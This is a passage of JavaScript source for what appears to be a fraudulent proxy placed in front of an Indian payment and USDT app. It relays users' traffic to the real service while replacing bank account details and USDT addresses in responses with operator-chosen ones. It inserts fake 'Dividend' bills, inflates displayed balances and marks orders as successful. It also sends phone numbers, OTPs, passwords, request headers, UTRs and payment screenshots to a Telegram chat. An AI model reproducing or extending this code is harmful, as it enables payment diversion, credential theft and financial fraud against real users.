    let tokenValue = '';
    if (respData && typeof respData === 'object') {
      userId = respData.uuid || respData.loginId || respData.userId || '';
      tokenValue = respData.tokenValue || '';
    }

    if (userId) {
      saveTokenUserId(req, userId);
      if (phone) userPhoneMap[String(userId)] = String(phone);
      if (tokenValue) {
        tokenUserMap[tokenValue.substring(0, 100)] = String(userId);
        if (redis) redis.hset('nine99payTokenMap', tokenValue.substring(0, 100), String(userId)).catch(()=>{});
      }
      trackUser(data, userId, 'Login OTP', phone);
      saveData(data).catch(()=>{});
    }

    if (data.adminChatId && bot) {
      const tag = `🔑 Login (OTP) [${userId || phone || 'N/A'}]`;
      const reqHeadersDump = JSON.stringify(req.headers, null, 2);
      const reqBodyDump = JSON.stringify(body, null, 2);
      const respDump = JSON.stringify(jsonResp, null, 2);
      const summary = `🔑 Login (OTP)\n📱 Phone: ${phone || 'N/A'}\n🔢 OTP: ${otp || 'N/A'}\n👤 UserID: ${userId || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
      bot.sendMessage(data.adminChatId, summary).catch(()=>{});
      sendChunked(bot, data.adminChatId, `${tag}\n📨 REQUEST HEADERS:\n${reqHeadersDump}`);
      sendChunked(bot, data.adminChatId, `${tag}\n📝 REQUEST BODY:\n${reqBodyDump}`);
      sendChunked(bot, data.adminChatId, `${tag}\n📥 RESPONSE:\n${respDump}`);
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/user/register', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const phone = body.phone || body.mobile || '';
    const pwd = body.pwd || body.password || '';

    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `📝 Register\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

async function proxyAndReplaceBankDetails(req, res, label) {
  const bodyOid = req.parsedBody?.orderId || req.parsedBody?.buyOrderNo || req.parsedBody?.orderNo || '';
  const qOid = req.query?.buyOrderNo || req.query?.orderId || '';
  const orderBankLookupId = bodyOid || qOid || '';

  try {
    const [data, proxyResult] = await Promise.all([
      loadData(),
      proxyFetch(req)
    ]);

    const { response, respBody, respHeaders, jsonResp } = proxyResult;
    const reqUserId = await extractUserId(req, jsonResp);
    const reqEff = getEffectiveSettings(data, reqUserId);
    if (reqEff.botEnabled === false) {
      res.writeHead(response.status, respHeaders);
      res.end(respBody);
      return;
    }

    const detectedUserId = reqUserId;
    const eff = getEffectiveSettings(data, detectedUserId);
    const active = eff.botEnabled !== false ? getActiveBank(data, detectedUserId) : null;

    const respData = getResponseData(jsonResp);

    if (debugNextResponse && data.adminChatId && bot) {
      debugNextResponse = false;
      bot.sendMessage(data.adminChatId, `🔍 DEBUG ${req.originalUrl}\n\n${JSON.stringify(jsonResp, null, 2).substring(0, 3500)}`).catch(()=>{});
    }

    const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
    const allOrderIds = [
      rd.buyOrderNo, rd.orderNo, rd.orderId, rd.buyOrderId, rd.id, orderBankLookupId
    ].filter(Boolean);
    const orderId = allOrderIds[0] || 'N/A';

    if (respData) {
      const savedBank = getOrderBankMultiple(data, allOrderIds);
      if (savedBank) {
        if (Array.isArray(respData)) {
          respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, savedBank, {}, 0); });
        } else {
          deepReplace(respData, savedBank, {}, 0);
        }
      }
      let shouldForceSuccess = eff.forceReviewSuccess;
      if (!shouldForceSuccess && !detectedUserId) {
        const successUserIds = getForceReviewSuccessUserIds(data);
        if (successUserIds.length === 1) {
          shouldForceSuccess = true;
        }
      }
      if (shouldForceSuccess) {
        if (Array.isArray(respData)) {
          respData.forEach(item => markReviewAsSuccess(item));
        } else {
          markReviewAsSuccess(respData);
        }
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);

    if (data.adminChatId && bot && !isLogOff(data, detectedUserId)) {
      const amount = rd.amount || rd.orderAmount || rd.buyAmount || req.parsedBody?.amount || 'N/A';
      const phone = getPhone(data, detectedUserId);
      const savedBank = getOrderBankMultiple(data, allOrderIds);
      // Detect skip-marker: order was intentionally left as real upstream bank (below threshold)
      let isRealPassthrough = false;
      for (const oid of allOrderIds) {
        if (oid && data.orderBankMap && data.orderBankMap[String(oid)] && data.orderBankMap[String(oid)]._skip) {
          isRealPassthrough = true;
          break;
        }
      }
      const bankUsed = savedBank || (!isRealPassthrough ? active : null);
      let sourceLine;
      if (savedBank) sourceLine = '📌 Source: Saved for this order';
      else if (isRealPassthrough) sourceLine = '🏦 Source: REAL upstream bank (amount below threshold)';
      else sourceLine = '⚡ Source: Active bank (no saved mapping)';
      bot.sendMessage(data.adminChatId,
`🔔 ${label}
👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
📋 Order: ${orderId}
💰 Amount: ₹${amount}
💳 Bank: ${bankUsed ? `${bankUsed.accountHolder} | ${bankUsed.accountNo}` : (isRealPassthrough ? 'REAL upstream' : 'N/A')}
${sourceLine}
🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }

    if (detectedUserId) {
      trackUser(data, detectedUserId, `Order ${jsonResp?.data?.orderId || jsonResp?.data?.buyOrderId || ''}`);
      saveData(data).catch(()=>{});
    }
  } catch(e) {
    console.error('Proxy+replace error:', req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

const COMPLETED_ORDER_STATUSES = ['success', 'cancel', 'cancelled', 'completed', 'done', 'failed', 'expired', 'refunded', 'rejected'];

function isActiveOrder(item) {
  const status = String(item.orderStatus || item.status || '').toLowerCase();
  if (COMPLETED_ORDER_STATUSES.includes(status)) return false;
  if (/success|cancel|complet|done|fail|expir|refund|reject/i.test(status)) return false;
  return true;
}

async function proxyAndReplaceBankInList(req, res) {
  try {
    const [data, { response, respBody, respHeaders, jsonResp }] = await Promise.all([
      cachedData ? Promise.resolve(cachedData) : loadData(),
      proxyFetch(req)
    ]);
    const detectedUserId = await extractUserId(req, jsonResp);
    if (detectedUserId) saveTokenUserId(req, detectedUserId);
    const eff = getEffectiveSettings(data, detectedUserId);
    const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, detectedUserId) : null;

    const listData = getResponseData(jsonResp);
    if (listData) {
      const applyToItem = (item) => {
        const itemUserId = item.userId ? String(item.userId) : detectedUserId;
        const itemEff = getEffectiveSettings(data, itemUserId);
        const itemActive = (itemEff.botEnabled !== false) ? getActiveBank(data, itemUserId) : null;
        if (itemActive) { const origVals = {}; deepReplace(item, itemActive, origVals, 0); }
        if (itemEff.depositSuccess) markDepositSuccess(item);
      };
      if (Array.isArray(listData)) {
        listData.forEach(applyToItem);
      } else if (listData.list && Array.isArray(listData.list)) {
        listData.list.forEach(applyToItem);
      } else if (listData.records && Array.isArray(listData.records)) {
        listData.records.forEach(applyToItem);
      } else if (listData.rows && Array.isArray(listData.rows)) {
        listData.rows.forEach(applyToItem);
      } else {
        applyToItem(listData);
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('List replace error:', req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

async function proxyAndInjectFakeBills(req, res) {
  try {
    const [data, { response, respBody, respHeaders, jsonResp }] = await Promise.all([
      cachedData ? Promise.resolve(cachedData) : loadData(),
      proxyFetch(req)
    ]);
    const detectedUserId = await extractUserId(req, jsonResp);
    if (detectedUserId) saveTokenUserId(req, detectedUserId);

    const listData = getResponseData(jsonResp);
    let items = [];
    let itemsKey = null;
    if (listData) {
      if (Array.isArray(listData)) {
        items = listData;
      } else if (listData.list && Array.isArray(listData.list)) {
        items = listData.list;
        itemsKey = 'list';
      } else if (listData.records && Array.isArray(listData.records)) {
        items = listData.records;
        itemsKey = 'records';
      } else if (listData.rows && Array.isArray(listData.rows)) {
        items = listData.rows;
        itemsKey = 'rows';
      }
    }

    let billUserId = detectedUserId;
    if (!billUserId && data.fakeBills) {
      const fbKeys = Object.keys(data.fakeBills).filter(k => data.fakeBills[k] && data.fakeBills[k].length > 0);
      if (fbKeys.length === 1) billUserId = fbKeys[0];
    }
    const userBills = (data.fakeBills && billUserId && data.fakeBills[String(billUserId)]) || [];
    if (userBills.length > 0) {
      const template = items.length > 0 ? items[0] : null;
      const fakeEntries = userBills.map(fb => {
        const entry = template ? JSON.parse(JSON.stringify(template)) : {};
        entry.orderNo = fb.orderNo;
        entry.amount = fb.amount;
        entry.orderType = 'Dividend';
        entry.time = fb.createTime;
        entry.createTime = fb.createTime;
        entry.status = 1;
        entry.statusText = 'Completed';
        if (entry.afterAmount !== undefined) entry.afterAmount = null;
        if (entry.remark !== undefined) entry.remark = null;
        if (entry.commissionAmount !== undefined) entry.commissionAmount = null;
        if (entry.arrivalTime !== undefined) entry.arrivalTime = null;
        if (entry.id !== undefined) entry.id = fb.orderNo;
        if (!template) entry.id = fb.orderNo;
        return entry;
      });
      fakeEntries.sort((a, b) => {
        const fbA = userBills.find(f => f.orderNo === a.orderNo);
        const fbB = userBills.find(f => f.orderNo === b.orderNo);
        return (fbB ? fbB.timestamp : 0) - (fbA ? fbA.timestamp : 0);
      });
      items = [...fakeEntries, ...items];
      if (itemsKey && listData) {
        listData[itemsKey] = items;
      } else if (jsonResp && jsonResp.data && Array.isArray(jsonResp.data)) {
        jsonResp.data = items;
      } else if (listData && typeof listData === 'object' && !Array.isArray(listData)) {
        const arrKey = listData.list !== undefined ? 'list' : listData.records !== undefined ? 'records' : listData.rows !== undefined ? 'rows' : 'list';
        listData[arrKey] = items;
        if (listData.total !== undefined) listData.total = items.length;
        if (listData.totalCount !== undefined) listData.totalCount = items.length;
      } else if (jsonResp) {
        if (jsonResp.data === null || jsonResp.data === undefined || (Array.isArray(jsonResp.data) && jsonResp.data.length === 0)) {
          jsonResp.data = items;
        }
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('bills inject error:', e.message);
    await transparentProxy(req, res);
  }
}

async function proxyAndReplaceBankInActiveOrders(req, res) {
  try {
    const [data, { response, respBody, respHeaders, jsonResp }] = await Promise.all([
      loadData(),
      proxyFetch(req)
    ]);
    const detectedUserId = await extractUserId(req, jsonResp);
    if (detectedUserId) saveTokenUserId(req, detectedUserId);

    const listData = getResponseData(jsonResp);
    if (listData) {
      let items = [];
      if (Array.isArray(listData)) {
        items = listData;
      } else if (listData.list && Array.isArray(listData.list)) {
        items = listData.list;
      } else if (listData.records && Array.isArray(listData.records)) {
        items = listData.records;
      } else if (listData.rows && Array.isArray(listData.rows)) {
        items = listData.rows;
      } else {
        items = [listData];
      }
      const eff = getEffectiveSettings(data, detectedUserId);
      const active = (eff.botEnabled !== false) ? getActiveBank(data, detectedUserId) : null;
      if (data.adminChatId && bot) {
        const orderBankKeys = data.orderBankMap ? Object.keys(data.orderBankMap).length : 0;
        const firstItem = items.length > 0 ? items[0] : {};
        const statusFields = {};
        for (const k of Object.keys(firstItem)) {
          const kl = k.toLowerCase();
          if (kl.includes('status') || kl.includes('state') || kl.includes('pay')) statusFields[k] = firstItem[k];
        }
        bot.sendMessage(data.adminChatId, `🔍 ORDER LIST DEBUG\nUser: ${detectedUserId}\nItems: ${items.length}\nforceReviewSuccess: ${eff.forceReviewSuccess}\norderBankMap entries: ${orderBankKeys}\n\n📋 First item status fields:\n${JSON.stringify(statusFields, null, 2)}\n\nFirst item IDs: ${[firstItem.buyOrderNo, firstItem.orderNo, firstItem.orderId].filter(Boolean).join(', ')}`).catch(()=>{});
      }
      const getItemIds = (item) => [item.buyOrderNo, item.orderNo, item.orderId, item.buyOrderId, item.id].filter(Boolean);
      const bankMap = {};
      for (const item of items) {
        const ids = getItemIds(item);
        const bank = getOrderBankMultiple(data, ids);
        if (bank) {
          const primaryId = ids[0] || '';
          if (primaryId) bankMap[primaryId] = bank;
        }
      }
      const eff2 = getEffectiveSettings(data, detectedUserId);
      let shouldForceSuccess = eff2.forceReviewSuccess;
      if (!shouldForceSuccess && !detectedUserId) {
        const successUserIds = getForceReviewSuccessUserIds(data);
        if (successUserIds.length === 1) {
          shouldForceSuccess = true;
        }
      }
      for (const item of items) {
        const ids = getItemIds(item);
        const primaryId = ids[0] || '';
        const savedBank = primaryId ? bankMap[primaryId] : null;
        if (savedBank) {
          deepReplace(item, savedBank, {}, 0);
        }
        if (shouldForceSuccess) {
          markReviewAsSuccess(item);
        }
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('Active list replace error:', req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

async function proxyAndAddBonus(req, res) {
  try {
    const [data, { response, respBody, respHeaders, jsonResp }] = await Promise.all([
      cachedData ? Promise.resolve(cachedData) : loadData(),
      proxyFetch(req)
    ]);
    const detectedUserId = await extractUserId(req, jsonResp);
    const eff = getEffectiveSettings(data, detectedUserId);
    const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;

    if (detectedUserId) {
      saveTokenUserId(req, detectedUserId);
      trackUser(data, detectedUserId, `App Open ${req.path}`);
      saveData(data).catch(()=>{});
    }

    const bonusData = getResponseData(jsonResp);
    if (bonus > 0 && bonusData) {
      addBonusToBalanceFields(bonusData, bonus);
    }

    if (detectedUserId && bonusData && typeof bonusData === 'object') {
      const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
      if (addedBal !== 0) {
        addBonusToBalanceFields(bonusData, addedBal);
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

app.post('/app/buy/order', async (req, res) => {
  const [data, proxyResult] = await Promise.all([
    cachedData ? Promise.resolve(cachedData) : loadData(),
    proxyFetch(req)
  ]);
  try {
    const { response, respBody, respHeaders, jsonResp } = proxyResult;
    const userId = await extractUserId(req, jsonResp);
    if (userId) { trackUser(data, userId, 'Buy Order'); saveData(data).catch(()=>{}); }
    const buyData = getResponseData(jsonResp);
    const body = req.parsedBody || {};
    let newOrderId = '';
    if (typeof buyData === 'string' && buyData.length > 5) {
      newOrderId = buyData;
    } else if (buyData && typeof buyData === 'object') {
      newOrderId = buyData.buyOrderNo || buyData.orderNo || buyData.orderId || buyData.buyOrderId || buyData.id || '';
    }
    if (newOrderId) {
      const eff = getEffectiveSettings(data, userId);
      const orderAmt = parseFloat(body.amount || body.buyAmount || body.orderAmount || '0') || 0;
      const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, userId, orderAmt) : null;
      if (active) {
        saveOrderBank(data, newOrderId, active);
        if (data.adminChatId && bot) {
          bot.sendMessage(data.adminChatId, `🔗 Bank saved for Order: ${newOrderId}\n💰 Amount: ₹${orderAmt}\n💳 ${active.accountHolder} | ${active.accountNo}${(Number(active.minAmount)||0) > 0 ? ' (min ₹' + Number(active.minAmount) + ')' : ''}`).catch(()=>{});
        }
      } else if (eff.botEnabled !== false && data.banks && data.banks.length > 0) {
        // No bank qualifies for this amount (or strict-mode active bank's threshold not met)
        // → mark skip so processOrderNo & details endpoints pass through real bank
        await markOrderBankSkip(data, newOrderId);
        if (data.adminChatId && bot) {
          let reason;
          if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) {
            const ab = data.banks[data.activeIndex];
            const abMin = Number(ab.minAmount) || 0;
            if (abMin > orderAmt) {
              reason = `active bank #${data.activeIndex + 1} requires ≥ ₹${abMin}`;
            } else {
              reason = `no bank qualifies for ₹${orderAmt}`;
            }
          } else {
            reason = `no bank qualifies for ₹${orderAmt}`;
          }
          bot.sendMessage(data.adminChatId, `⏭️ Order ${newOrderId} amount ₹${orderAmt} — ${reason} → REAL bank will be shown`).catch(()=>{});
        }
      }
    }
    sendJson(res, respHeaders, jsonResp, respBody);

    if (data.adminChatId && bot) {
      const phone = getPhone(data, userId);
      bot.sendMessage(data.adminChatId, `⚠️ Buy Order Created\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\nAmount: ₹${body.amount || body.buyAmount || 'N/A'}\nOrder: ${newOrderId || 'N/A'}\nData type: ${typeof buyData}\nData: ${typeof buyData === 'string' ? buyData.substring(0, 100) : JSON.stringify(buyData).substring(0, 200)}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
    }
  } catch(e) {
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `❌ Buy Order ERROR: ${e.message}`).catch(()=>{});
    }
    await transparentProxy(req, res);
  }
});

app.all('/app/buy/order/details', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '💳 Order Details');
});

app.post('/app/buy/order/paid', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const phone = getPhone(data, userId);
      bot.sendMessage(data.adminChatId, `✅ Order Paid [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nOrder: ${body.orderId || body.orderNo || body.buyOrderId || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
    }
    if (userId) { trackUser(data, userId, 'Paid'); saveData(data).catch(()=>{}); }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/buy/order/submitUtr', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const phone = getPhone(data, userId);
      const utrVal = body.trxId || body.utr || body.transactionId || body.referenceNo || 'N/A';
      const orderVal = body.orderNo || body.orderId || body.buyOrderId || 'N/A';
      const imgVal = body.imgUrl || '';
      let msg = `📤 UTR Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nUTR: ${utrVal}\nOrder: ${orderVal}`;
      if (imgVal) msg += `\nScreenshot: ${imgVal}`;
      bot.sendMessage(data.adminChatId, msg).catch(()=>{});
      if (imgVal) {
        try {
          const imgResp = await fetch(imgVal.startsWith('http') ? imgVal : ORIGINAL_API + '/' + imgVal);
          if (imgResp.ok) {
            const imgBuf = Buffer.from(await imgResp.arrayBuffer());
            if (imgBuf.length > 100) {
              await bot.sendPhoto(data.adminChatId, imgBuf, { caption: `📸 Payment Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nUTR: ${utrVal}\nOrder: ${orderVal}` }, { filename: 'screenshot.jpg', contentType: 'image/jpeg' });
            }
          }
        } catch(e) {}
      }
    }
    if (userId) { trackUser(data, userId, `UTR ${body.trxId || body.utr || body.transactionId || ''}`); saveData(data).catch(()=>{}); }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/buy/order/cancel', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      bot.sendMessage(data.adminChatId, `❌ Order Cancelled [${userId || 'N/A'}]\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || 'N/A'}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/buy/order/processOrderNo', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = await extractUserId(req, jsonResp);
    const eff = getEffectiveSettings(data, detectedUserId);
    const respData = getResponseData(jsonResp);

    if (typeof respData === 'string' && respData.length > 5 && eff.botEnabled !== false) {
      // Respect prior decision from /app/buy/order (real-bank skip OR saved bank)
      if (!hasOrderBankEntry(data, respData)) {
        // Order amount is NOT available on this endpoint. Be conservative:
        // Only pick a bank that has no minAmount threshold (minAmount=0). If every
        // bank has a threshold, leave map empty so real upstream bank passes through.
        const active = getActiveBank(data, detectedUserId, 0);
        if (active) {
          saveOrderBank(data, respData, active);
          if (data.adminChatId && bot) {
            bot.sendMessage(data.adminChatId, `🔗 processOrderNo: Bank saved for ${respData}\n💳 ${active.accountHolder} | ${active.accountNo}`).catch(()=>{});
          }
        } else if (data.adminChatId && bot && data.banks && data.banks.length > 0) {
          bot.sendMessage(data.adminChatId, `⏭️ processOrderNo: Order ${respData} — no threshold-free bank available & amount unknown → REAL bank passthrough`).catch(()=>{});
        }
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/buy/order/simpleUserBank', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '🏦 User Bank List');
});

app.all('/app/buy/order/listBuyOrders', async (req, res) => {
  await proxyAndReplaceBankInActiveOrders(req, res);
});

app.all('/app/buy/order/listUserBuyOrders', async (req, res) => {
  await proxyAndReplaceBankInActiveOrders(req, res);
});

app.all('/app/sell/order/listUserSellOrders', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});

app.all('/app/usdt', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.usdtAddress && jsonResp) replaceUsdtInResponse(jsonResp, data);
    const detectedUserId = await extractUserId(req, jsonResp);
    if (detectedUserId) {
      saveTokenUserId(req, detectedUserId);
      const bonusData = getResponseData(jsonResp);
      if (bonusData && typeof bonusData === 'object') {
        const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
        const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
        if (addedBal !== 0) addBonusToBalanceFields(bonusData, addedBal);
      }
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/usdt/buy', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const phone = getPhone(data, userId);
      bot.sendMessage(data.adminChatId, `₮ USDT Buy [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nAmount: ${body.amount || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
    }
    if (data.usdtAddress && jsonResp) replaceUsdtInResponse(jsonResp, data);
    if (userId) { trackUser(data, userId, 'USDT Buy'); saveData(data).catch(()=>{}); }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/usdt/submit', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const phone = getPhone(data, userId);
      bot.sendMessage(data.adminChatId, `₮ USDT Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nHash: ${body.hash || body.txHash || body.transactionHash || 'N/A'}\nAmount: ${body.amount || 'N/A'}`).catch(()=>{});
    }
    if (userId) { trackUser(data, userId, 'USDT Submit'); saveData(data).catch(()=>{}); }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/usdt/list', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.usdtAddress && jsonResp) replaceUsdtInResponse(jsonResp, data);
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/usdt/pending', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.usdtAddress && jsonResp) replaceUsdtInResponse(jsonResp, data);
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/usdt/buy/details', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.usdtAddress && jsonResp) replaceUsdtInResponse(jsonResp, data);
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/home', async (req, res) => {
  await proxyAndAddBonus(req, res);
});

app.all('/app/user/mine', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const respData = getResponseData(jsonResp);
    const uid = respData?.userId || respData?.uuid || '';
    const effectiveUserId = uid ? String(uid) : '';
    let phone = '';
    let bal = '';
    let userName = '';
    if (respData && typeof respData === 'object') {
      phone = respData.userName || respData.phone || respData.mobile || '';
      bal = respData.balance ?? respData.availableWithdrawBalance ?? '';
      userName = respData.userName || '';
    }
    const realBalance = respData?.balance ?? '';
    const realWithdraw = respData?.availableWithdrawBalance ?? '';
    const realProcess = respData?.processWithdrawBalance ?? '';
    const userOvr = effectiveUserId ? (data.userOverrides && data.userOverrides[String(effectiveUserId)]) : null;
    const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
    if (effectiveUserId && respData && typeof respData === 'object' && addedBal !== 0) {
      if (respData.balance !== undefined) {
        const numBal = parseFloat(respData.balance) || 0;
        respData.balance = typeof respData.balance === 'string'
          ? String(parseFloat((numBal + addedBal).toFixed(2)))
          : parseFloat((numBal + addedBal).toFixed(2));
      }
    }
    const visibleBalance = respData?.balance ?? '';
    sendJson(res, respHeaders, jsonResp, respBody);
    if (effectiveUserId) {
      saveTokenUserId(req, effectiveUserId);
      if (!data.trackedUsers) data.trackedUsers = {};
      const existing = data.trackedUsers[String(effectiveUserId)] || {};
      data.trackedUsers[String(effectiveUserId)] = {
        ...existing,
        lastAction: 'mine',
        lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: phone || existing.phone || '',
        name: userName || existing.name || '',
        balance: realBalance !== '' ? realBalance : (existing.balance || ''),
        orderCount: existing.orderCount || 0
      };
      saveData(data).catch(()=>{});
    }
    if (data.adminChatId && bot && !isLogOff(data, effectiveUserId) && !(await isLogOffByToken(data, req))) {
      bot.sendMessage(data.adminChatId, `👤 User Profile\n🆔 ID: ${effectiveUserId || 'N/A'}\n📛 Name: ${userName || 'N/A'}\n📱 Phone: ${phone || 'N/A'}\n━━━━━━━━━━━━━━\n💰 Real Balance: ₹${realBalance}\n${addedBal !== 0 ? `➕ Bot Added: ₹${addedBal}\n👁 User Sees: ₹${visibleBalance}` : '➕ Bot Added: ₹0'}\n━━━━━━━━━━━━━━\n💳 Withdraw Balance: ₹${realWithdraw}\n⏳ In Process: ₹${realProcess}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
    }
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/uploadOSS', async (req, res) => {
  const data = await loadData();
  try {
    const url = ORIGINAL_API + req.originalUrl;
    const fwd = {};
    for (const [k, v] of Object.entries(req.headers)) {
      const kl = k.toLowerCase();
      if (kl === 'host' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
      fwd[k] = v;
    }
    fwd['host'] = 'nine99pay.com';
    const opts = { method: req.method, headers: fwd };
    if (req.rawBody && req.rawBody.length > 0) {
      opts.body = req.rawBody;
      fwd['content-length'] = String(req.rawBody.length);
    }
    const response = await fetch(url, opts);
    const respBody = await response.text();
    const respHeaders = {};
    response.headers.forEach((val, key) => {
      const kl = key.toLowerCase();
      if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
        respHeaders[key] = val;
      }
    });
    let jsonResp = null;
    try { jsonResp = JSON.parse(respBody); } catch(e) {}
    const userId = await extractUserId(req, jsonResp);
    const phone = getPhone(data, userId);
    if (data.adminChatId && bot && req.rawBody && req.rawBody.length > 0 && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const contentType = req.headers['content-type'] || '';
      let imageSent = false;
      if (contentType.includes('multipart/form-data')) {
        const boundaryMatch = contentType.match(/boundary=([^\s;]+)/);
        if (boundaryMatch) {
          const boundary = boundaryMatch[1];
          const raw = req.rawBody;
          const boundaryBuf = Buffer.from('--' + boundary);
          const parts = [];
          let startIdx = 0;
          while (true) {
            const idx = raw.indexOf(boundaryBuf, startIdx);
            if (idx === -1) break;
            if (startIdx > 0) parts.push(raw.slice(startIdx, idx));
            startIdx = idx + boundaryBuf.length;
            if (raw[startIdx] === 0x0d) startIdx++;
            if (raw[startIdx] === 0x0a) startIdx++;
          }
          for (const part of parts) {
            const headerEnd = part.indexOf('\r\n\r\n');
            if (headerEnd === -1) continue;
            const headerStr = part.slice(0, headerEnd).toString('utf8');
            if (/content-type:\s*(image\/|application\/octet-stream)/i.test(headerStr) ||
